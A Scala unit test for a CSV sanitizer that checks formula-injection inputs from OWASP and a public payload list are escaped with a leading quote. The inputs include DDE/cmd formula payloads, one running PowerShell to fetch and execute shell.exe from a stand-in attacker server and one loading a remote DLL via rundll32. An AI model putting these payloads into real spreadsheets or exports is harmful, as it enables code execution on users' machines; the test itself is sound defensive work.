package org.silkframework.plugins.dataset.csv

import org.scalatest.flatspec.AnyFlatSpec
import org.scalatest.matchers.should.Matchers
import CSVSanitizer.sanitize

class CSVSanitizerTest extends AnyFlatSpec with Matchers {
  // Examples from https://owasp.org/www-community/attacks/CSV_Injection
  it should "sanitize the documented examples in OWASP" in {
    sanitize("""=1+2";=1+2""") shouldBe """"'=1+2"";=1+2""""
    sanitize("""=1+2'" ;,=1+2""") shouldBe """"'=1+2'"" ;,=1+2""""
  }

  // Examples from https://github.com/payloadbox/csv-injection-payloads
  it should "sanitize the CSV injection payloads" in {
    sanitize("""=DDE("cmd";"/C calc";"!A0")A0""") shouldBe """"'=DDE(""cmd"";""/C calc"";""!A0"")A0""""
    sanitize("""@SUM(1+9)*cmd|' /C calc'!A0""") shouldBe """"'@SUM(1+9)*cmd|' /C calc'!A0""""
    sanitize("""=10+20+cmd|' /C calc'!A0""") shouldBe """"'=10+20+cmd|' /C calc'!A0""""
    sanitize("""=cmd|' /C notepad'!'A1'""") shouldBe """"'=cmd|' /C notepad'!'A1'""""
    sanitize("""=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0""") shouldBe """"'=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0""""
    sanitize("""=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1""") shouldBe """"'=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1""""
  }
}
